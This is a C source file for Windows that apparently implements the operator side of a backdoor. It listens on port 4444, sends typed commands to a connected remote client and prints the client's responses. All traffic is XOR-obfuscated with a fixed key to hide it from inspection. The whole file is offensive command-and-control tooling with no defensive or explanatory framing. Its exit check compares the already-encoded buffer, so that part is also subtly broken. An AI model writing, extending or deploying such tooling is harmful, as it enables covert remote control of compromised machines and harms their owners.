#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h> // Winsock for networking
#include <windows.h>  // For Windows-specific APIs

#pragma comment(lib, "ws2_32.lib") // Link Winsock library

#define PORT 4444
#define XOR_KEY 0xAA // Simple XOR encryption key

void xor_encrypt_decrypt(char *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

void handle_client(SOCKET client_sock) {
    char buffer[1024];
    while (1) {
        printf("Enter command: ");
        fgets(buffer, sizeof(buffer), stdin);
        buffer[strcspn(buffer, "\n")] = '\0'; // Remove newline

        xor_encrypt_decrypt(buffer, strlen(buffer));

        if (send(client_sock, buffer, strlen(buffer), 0) < 0) {
            perror("Send failed");
            break;
        }

        if (strcmp(buffer, "exit") == 0) {
            printf("Exiting...\n");
            break;
        }

        memset(buffer, 0, sizeof(buffer));
        if (recv(client_sock, buffer, sizeof(buffer), 0) < 0) {
            perror("Receive failed");
            break;
        }

        xor_encrypt_decrypt(buffer, strlen(buffer));
        printf("Client response: %s\n", buffer);
    }
}

int main() {
    WSADATA wsa;
    SOCKET server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    int addr_len = sizeof(client_addr);

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
        return 1;
    }

    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed. Error Code: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return 1;
    }

    if (listen(server_sock, 1) == SOCKET_ERROR) {
        printf("Listen failed. Error Code: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return 1;
    }

    printf("Waiting for incoming connections on port %d...\n", PORT);
    client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len);
    if (client_sock == INVALID_SOCKET) {
        printf("Accept failed. Error Code: %d\n", WSAGetLastError());
        closesocket(server_sock);
        WSACleanup();
        return 1;
    }

    printf("Client connected.\n");
    handle_client(client_sock);

    closesocket(client_sock);
    closesocket(server_sock);
    WSACleanup();
    return 0;
}
